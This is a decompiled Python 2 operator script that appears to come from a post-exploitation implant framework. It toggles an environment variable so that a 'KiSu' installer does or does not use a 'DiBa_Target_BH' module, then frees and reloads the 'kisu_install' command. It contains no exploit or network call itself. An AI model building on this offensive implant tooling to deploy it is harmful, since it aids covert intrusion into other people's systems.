# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _KiSu_BH_enable.py
Quiet = 'quiet'
Enable = 'enable'
EnvironmentVar = '_SUB_DIBA_TARGET'
BH_ModuleName = 'DiBa_Target_BH'

def main():
    import dsz
    import dsz.lp
    import demi
    import sys
    dsz.control.echo.Off()
    cmdParams = dsz.lp.cmdline.ParseCommandLine(sys.argv, '_KiSu_BH_enable.txt')
    if len(cmdParams) == 0:
        return False
    bQuiet = Quiet in cmdParams
    if Enable not in cmdParams:
        if not bQuiet:
            dsz.ui.Echo('* -enable must be specified', dsz.ERROR)
        return False
    state = cmdParams[Enable][0].lower()
    currentState = 'off'
    try:
        curVal = dsz.env.Get(EnvironmentVar)
        currentState = 'on'
    except Exception as e:
        pass

    if state == currentState:
        if not bQuiet:
            dsz.ui.Echo('KiSu is already configured %s' % ('to use BH' if state == 'on' else 'not to use BH'), dsz.WARNING)
        return True
    if dsz.cmd.Run('available -command kisu_install -isloaded'):
        if not bQuiet:
            dsz.ui.Echo('Freeing kisu_install')
        if dsz.cmd.Run('free -command kisu_install'):
            if not bQuiet:
                dsz.ui.Echo('    PASSED', dsz.GOOD)
        else:
            if not bQuiet:
                dsz.ui.Echo('    FAILED', dsz.ERROR)
            if not bQuiet:
                dsz.ui.Echo('* Manual freeing and loading must occur before this can be set', dsz.ERROR)
            return False
    if not bQuiet:
        dsz.ui.Echo('Changing environment')
    if state == 'on':
        try:
            dsz.env.Set(EnvironmentVar, BH_ModuleName)
        except:
            if not bQuiet:
                dsz.ui.Echo('    FAILED (Unable to set environment variable)', dsz.ERROR)
            return False

    else:
        try:
            dsz.env.Delete(EnvironmentVar)
        except:
            if not bQuiet:
                dsz.ui.Echo('    FAILED (Unable to delete environment variable)', dsz.ERROR)
            return False

    if not bQuiet:
        dsz.ui.Echo('    PASSED', dsz.GOOD)
    if not bQuiet:
        dsz.ui.Echo('Load DIBA module')
    if dsz.cmd.Run('available -command kisu_install -load'):
        if not bQuiet:
            dsz.ui.Echo('    PASSED', dsz.GOOD)
    elif not bQuiet:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
    return True


if __name__ == '__main__':
    if main() != True:
        import sys
        sys.exit(-1)